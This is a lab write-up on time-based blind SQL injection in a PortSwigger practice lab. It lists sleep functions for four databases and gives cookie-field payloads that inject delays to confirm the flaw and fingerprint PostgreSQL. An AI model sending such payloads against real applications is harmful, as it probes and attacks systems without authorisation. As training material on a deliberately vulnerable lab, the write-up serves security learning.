# Blind SQL Injection with Time Delays

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Exploit the SQL injection vulnerability to cause a **10 second delay** in the application response.

---

## Lab

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

**Time-Based Blind SQLi** is used when:
- The application returns no data from the query
- No error messages are shown
- No difference in response based on true/false conditions

The only observable channel is **time** — we inject a sleep/delay function and measure how long the response takes. If the response is delayed, our condition was true.

```
Condition TRUE  → delay fires → response takes 10 seconds
Condition FALSE → no delay   → response is instant
```

---

## Time Delay Functions by Database

| Database | Delay Query |
|----------|-------------|
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |
| MSSQL | `WAITFOR DELAY '0:0:10'` |
| Oracle | `dbms_pipe.receive_message('a',10)` |

---

## Steps to Solve

---

**Step 1 — Confirm Injection Point**

The injection point is the **TrackingId** cookie. First confirm the application behaves the same regardless of input — no error, no change in response body.

```http
Cookie: TrackingId=xyz'
Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
```

All return same response — confirms **pure blind SQLi** with no conditional response channel.

<img width="364" height="98" alt="image" src="https://github.com/user-attachments/assets/872bce62-0b1e-4a6d-8191-5c4468326d74" />

---

**Step 2 — Identify the Database**

We test time delay syntax for each database. The one that causes a real delay = confirmed database.

Test PostgreSQL:
```http
Cookie: TrackingId=xyz'||pg_sleep(10)--
```

Test MySQL:
```http
Cookie: TrackingId=xyz' AND SLEEP(10)--
```

Test MSSQL:
```http
Cookie: TrackingId=xyz'; WAITFOR DELAY '0:0:10'--
```

Test Oracle:
```http
Cookie: TrackingId=xyz'||dbms_pipe.receive_message(('a'),10)--
```

Send each one and measure response time. The one that takes **~10 seconds** = confirmed database.

<img width="1897" height="256" alt="image" src="https://github.com/user-attachments/assets/f6744512-d767-45c0-8e1e-17b49e2e7063" />

---

**Step 3 — Trigger 10 Second Delay**

Once database is confirmed, use the correct syntax to trigger exactly 10 seconds:

**PostgreSQL:**
```http
Cookie: TrackingId=xyz'||pg_sleep(10)--
```

**MySQL:**
```http
Cookie: TrackingId=xyz' AND SLEEP(10)--
```

**MSSQL:**
```http
Cookie: TrackingId=xyz'; WAITFOR DELAY '0:0:10'--
```

**Oracle:**
```http
Cookie: TrackingId=xyz'||dbms_pipe.receive_message(('a'),10)--
```

The response takes **10 seconds** to return — lab condition met.

IT's **PostgreSQL**.

<img width="1897" height="256" alt="image" src="https://github.com/user-attachments/assets/032fc63b-40ba-41d3-804d-fbd949f576d8" />

---

**Lab Solved**

<img width="1564" height="497" alt="image" src="https://github.com/user-attachments/assets/56364bd2-db58-47e0-ad93-5e9461c93bc1" />

---

## How This Differs from Previous Labs

| | Conditional Response | Conditional Error | Visible Error | Time Delay |
|--|--|--|--|--|
| Data channel | Response body | Status code | Error message | **Response time** |
| True condition | Welcome back! | 500 error | Data in error | **Slow response** |
| False condition | No message | 200 normal | No error | **Fast response** |
| Requires fuzzer | Yes | Yes | No | Yes (lab 2) |
| Detects data by | Body size | Status code | Error text | **Seconds elapsed** |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
